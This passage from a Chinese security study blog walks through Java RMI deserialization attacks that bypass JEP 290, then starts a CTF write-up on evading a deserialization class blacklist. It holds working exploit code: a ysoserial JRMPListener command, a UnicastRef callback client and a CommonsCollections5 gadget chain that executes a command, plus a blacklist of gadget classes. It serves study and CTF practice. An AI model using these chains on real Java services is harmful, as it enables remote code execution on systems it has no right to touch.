<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">registryFilter:</span><span class="number">427</span>, RegistryImpl (sun.rmi.registry)</span><br><span class="line"><span class="symbol">checkInput:</span><span class="number">-1</span>, <span class="number">2059904228</span> (sun.rmi.registry.RegistryImpl$$Lambda<span class="number">$2</span>)</span><br><span class="line"><span class="symbol">filterCheck:</span><span class="number">1239</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">readProxyDesc:</span><span class="number">1813</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">readClassDesc:</span><span class="number">1748</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">readOrdinaryObject:</span><span class="number">2042</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">readObject0:</span><span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">readObject:</span><span class="number">431</span>, ObjectInputStream (java.io)</span><br><span class="line"><span class="symbol">dispatch:</span><span class="number">76</span>, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line"><span class="symbol">oldDispatch:</span><span class="number">468</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line"><span class="symbol">dispatch:</span><span class="number">300</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line"><span class="symbol">run:</span><span class="number">200</span>, Transport<span class="number">$1</span> (sun.rmi.transport)</span><br><span class="line"><span class="symbol">run:</span><span class="number">197</span>, Transport<span class="number">$1</span> (sun.rmi.transport)</span><br><span class="line"><span class="symbol">doPrivileged:</span><span class="number">-1</span>, AccessController (java.security)</span><br><span class="line"><span class="symbol">serviceCall:</span><span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line"><span class="symbol">handleMessages:</span><span class="number">573</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line"><span class="symbol">run0:</span><span class="number">834</span>, TCPTransport<span class="number">$ConnectionHandler</span> (sun.rmi.transport.tcp)</span><br><span class="line"><span class="symbol">lambda$run$0:</span><span class="number">688</span>, TCPTransport<span class="number">$ConnectionHandler</span> (sun.rmi.transport.tcp)</span><br><span class="line"><span class="symbol">run:</span><span class="number">-1</span>, <span class="number">714624149</span> (sun.rmi.transport.tcp.TCPTransport<span class="number">$ConnectionHandler</span>$$Lambda<span class="number">$5</span>)</span><br><span class="line"><span class="symbol">doPrivileged:</span><span class="number">-1</span>, AccessController (java.security)</span><br><span class="line"><span class="symbol">run:</span><span class="number">687</span>, TCPTransport<span class="number">$ConnectionHandler</span> (sun.rmi.transport.tcp)</span><br><span class="line"><span class="symbol">runWorker:</span><span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line"><span class="symbol">run:</span><span class="number">624</span>, ThreadPoolExecutor<span class="number">$Worker</span> (java.util.concurrent)</span><br><span class="line"><span class="symbol">run:</span><span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h4 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h4><p>用UnicastRef对象新建一个RMI连接绕过JEP290的限制,看下ysoserial的JRMPClient的payload</p>
<p><img src="https://baicany.github.io/images/87c38e18-7a58-404a-8465-89a0a3ef8149.png-w331s" alt="img"></p>
<p>这几行代码会向指定的RMI Registry发起请求,并且在白名单列表里面,在看下服务端和客户端调用LocateRegistry.getRegistry方法的代码。</p>
<p>代码位置<code>java.rmi.registry#getRegistry</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                    <span class="literal">false</span>);</span><br><span class="line">    <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">        (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和payload发起RMI Registry请求代码是一样的。</p>
<p>先用ysoserial启动RMI registry<code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;open /Applications/Calculator.app&quot;</code></p>
<p>然后把这个payload放在服务端bind看下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">            <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1199</span>);</span><br><span class="line">            <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">            <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(HelloServer.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                    Registry.class</span><br><span class="line">            &#125;, obj);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello&quot;</span>, proxy);</span><br></pre></td></tr></table></figure>

<p>当我们调用bind方法后，会通过UnicastRef对象中存储的信息与注册中心进行通信:</p>
<p>这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到RemoteObjectInvacationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvacationHandler没有readObject方法），在readObject里的最后一行会调用ref.readExternal方法，并将ObjectInputStream传进去：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ref.readExternal(in);</span><br></pre></td></tr></table></figure>

<p>UnicastRef#readExternal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LiveRef#read</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      TCPEndpoint var2;</span><br><span class="line">      <span class="keyword">if</span> (var1) &#123;</span><br><span class="line">          var2 = TCPEndpoint.read(var0);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          var2 = TCPEndpoint.readHostPortFormat(var0);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjID</span> <span class="variable">var3</span> <span class="operator">=</span> ObjID.read(var0);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">var4</span> <span class="operator">=</span> var0.readBoolean();</span><br><span class="line">      <span class="type">LiveRef</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(var3, var2, <span class="literal">false</span>);        </span><br></pre></td></tr></table></figure>

<p>这里在上边会把LiveRef对象还原，LiveRef对象中存了我们序列化进去的ip和端口，之后会调用DGCClient#registerRefs</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tatic <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint var0, List&lt;LiveRef&gt; var1)</span> &#123;</span><br><span class="line">        DGCClient.EndpointEntry var2;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            var2 = DGCClient.EndpointEntry.lookup(var0);</span><br><span class="line">        &#125; <span class="keyword">while</span>(!var2.registerRefs(var1));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>var2这里转回来的是一个DGCClient对象，里边同样封装了我们的端口信息，接着看到registerRefs方法中的<code>this.makeDirtyCall(var2, var3);</code></p>
<p>这里会调到DGCClient#makeDirtyCall，并把var2传进去，var2里封装了我们的endpoint信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Lease</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.dgc.dirty(var4, var2, <span class="keyword">new</span> <span class="title class_">Lease</span>(DGCClient.vmid, DGCClient.leaseValue));</span><br></pre></td></tr></table></figure>

<p>这里会进到dirty方法中，var4是我们传进去的ObjID对象，var1是一个HashSet对象，里边存了我们的Endpoint信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">                var24 = (Lease)var9.readObject();</span><br></pre></td></tr></table></figure>

<p>这里wirteObject后，会用invoke将数据发出去，接下来从socket连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置filter，所以这里可以直接导致注册中心rce，所以我们可以伪造一个socket连接并把我们恶意序列化的对象发过去</p>
<p>对应客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">7777</span>);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="用Object绕JEP290限制"><a href="#用Object绕JEP290限制" class="headerlink" title="用Object绕JEP290限制"></a>用Object绕JEP290限制</h4><p>JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload,传输依然会有问题。先把接口都新增一个sayPayload的方法,参数都是Object类型的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.sRemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">sayPayload</span><span class="params">(Object from)</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在把服务端HelloImpl代码改下,去实现这个方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello from &quot;</span> + from + <span class="string">&quot;!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;sayHello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">sayPayload</span><span class="params">(Object from)</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello from &quot;</span> + from + <span class="string">&quot;!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端在调用这个sayPayload方法时直接传payload看下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">HelloInterface</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloInterface) registry.lookup(<span class="string">&quot;hello1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> poc.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">            hello.sayPayload(poc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行后服务端计算器直接弹出,如果把这个payload作为sayPayload方法的返回值 客户端计算器也会弹出。</p>
<p>调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">marshalValue:<span class="number">290</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">dispatch:<span class="number">367</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">573</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">834</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">0</span>:<span class="number">688</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">316535884</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">5</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">687</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>在实际使用场景很少有参数是Object类型的,而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String),具体有如下四种bypass的思路</p>
<ul>
<li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li>
<li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li>
<li>使用诸如Javassist这样的工具修改字节码</li>
<li>通过实现代理替换网络流上已经序列化的对象</li>
</ul>
<p>通过RASP hook住<code>java.rmi.server.RemoteObjectInvocationHandler</code>类的InvokeRemoteMethod方法的第三个参数非Object的改为Object的gadget。不熟悉RASP的先要去了解下。</p>
<p>我这里使用CommonsCollections5这条链,Hook invokeRemoteMethod函数。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SICTF CC7+CC3</title>
    <url>/2023/09/13/SICTF/</url>
    <content><![CDATA[<p>重装了一次电脑这次拖的时间有点久了,在比赛完一天后应该就要写出来的</p>
<h1 id="do-you-konw-cc"><a href="#do-you-konw-cc" class="headerlink" title="do you konw cc"></a>do you konw cc</h1><h2 id="DefaultedMap"><a href="#DefaultedMap" class="headerlink" title="DefaultedMap"></a>DefaultedMap</h2><p>DefaultedMap在功能上和lazymap差不多吧</p>
<p>在DefaultedMap的get方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value <span class="keyword">instanceof</span> Transformer ? ((Transformer)<span class="built_in">this</span>.value).transform(key) : <span class="built_in">this</span>.value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这当value是transformer的实例的时候,会调用value的transform方法,这里的key是传过来的key,条件是this.map没有这个key,来看看构造方法,这里就用一个就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Transformer must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultedMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现value是我们可控的,所以找到我们能用的transformer就行</p>
<p>重点是怎么调用get方法了</p>
<h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>InstantiateTransformer就是transformer的实例化类并且在c3链中有,这里就再回顾一遍它的构造方法有一个是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里para其就是就是args的类型,而arges就是它的实例,看transformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>发现就是实例化input类,这里构造器的种类和实例化参数都是我们可控的,之前c3链用到了TrAXFilter,这个类有个一个构造方法,会调用TransformerImpl的newtransformer从而加载类</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = &#123;<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.map.TransformedMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.lang.annotation&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javax.management.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.springframework&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.rometools.rome.feed.impl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.net.URL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.lang.reflect.Proxy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.fasterxml.jackson&quot;</span>, <span class="string">&quot;com.sun.jndi&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.security&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>发现lazp,tiedmap都被禁用了,所以用了defaultedmap,chain和invoke也被禁用了,所以能用的就instantiate了</p>
<p>由于环境不出网,所以只有打内存马了,但是这里又是2.6以上的</p>
<p>由于TiedMapEntry被禁用了c3和c6中间链就断了,所以想办法从c7链找办法</p>
